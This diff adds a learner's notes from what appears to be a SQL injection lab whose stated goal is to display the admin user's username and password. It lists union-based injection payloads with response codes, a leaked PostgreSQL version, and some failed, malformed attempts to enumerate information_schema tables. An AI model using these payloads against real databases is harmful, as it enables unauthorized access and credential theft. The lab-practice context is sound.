@@ -1,0 +1,24 @@
+Goal: display the username and password for the admin user
+
+' order by 1 -- (200)
+' order by 2 -- (200)
+
+' union select null, null -- (200)
+' union select 'a', null -- (200)
+
+Mistake
+ |
+ \/
+' union select 'a', @@version -- (500)
+
+' union select version(), null -- (200)
+
+Version: PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+Use "SELECT * FROM information_schema.tables" to display all
+the tables
+
+' union select * from information-schema.tables, null -- (500)
+' union select information-schema.tables, null -- (500)
+
+' select * from information_schema.tables
